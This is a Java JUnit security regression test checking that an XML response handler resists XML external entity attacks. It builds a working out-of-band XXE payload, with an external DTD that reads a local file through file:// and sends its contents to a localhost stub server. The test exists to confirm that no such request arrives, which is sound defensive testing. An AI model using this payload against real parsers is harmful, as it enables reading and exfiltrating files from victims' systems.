public class StaxResponseHandlerIntegrationTest {
  @Rule public WireMockRule wireMockServer=new WireMockRule(0);
  @Rule public TemporaryFolder temporaryFolder=new TemporaryFolder();
  @Test(expected=VerificationException.class) public void saxParserShouldNotExposeLocalFileSystem() throws Exception {
    File tmpFile=temporaryFolder.newFile("contents.txt");
    writeToTmpFile(tmpFile,"hello-world");
    String payload="<?xml version=\"1.0\" ?> \n" + "<!DOCTYPE a [ \n" + "<!ENTITY % asd SYSTEM \"http://127.0.0.1:" + wireMockServer.port() + "/payload.dtd\"> \n"+ "%asd; \n"+ "%c; \n"+ "]> \n"+ "<a>&rrr;</a>";
    String entityString="<!ENTITY % file SYSTEM \"file://" + tmpFile.getAbsolutePath() + "\"> \n"+ "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'http://127.0.0.1:"+ wireMockServer.port()+ "/?%file;'>\">";
    stubFor(get(urlPathEqualTo("/payload.dtd")).willReturn(aResponse().withBody(entityString)));
    stubFor(get(urlPathEqualTo("/?hello-world")).willReturn(aResponse()));
    StaxResponseHandler<String> responseHandler=new StaxResponseHandler<String>(dummyUnmarshaller());
    HttpResponse response=mock(HttpResponse.class);
    when(response.getContent()).thenReturn(new ByteArrayInputStream(payload.getBytes(Charset.forName("UTF-8"))));
    try {
      responseHandler.handle(response);
    }
 catch (    Exception e) {
    }
    WireMock.verify(getRequestedFor(urlPathEqualTo("/?hello-world")));
  }
  @SuppressWarnings("unchecked") private Unmarshaller<String,StaxUnmarshallerContext> dummyUnmarshaller(){
    return new Unmarshaller<String,StaxUnmarshallerContext>(){
      @Override public String unmarshall(      StaxUnmarshallerContext in) throws Exception {
        while (!in.nextEvent().isEndDocument()) {
        }
        return "Success";
      }
    }
;
  }
  private void writeToTmpFile(  File tmpFile,  String contents) throws FileNotFoundException {
    PrintWriter writer=null;
    try {
      writer=new PrintWriter(tmpFile);
      writer.write(contents);
      writer.flush();
    }
  finally {
      if (writer != null) {
        writer.close();
      }
    }
  }
}
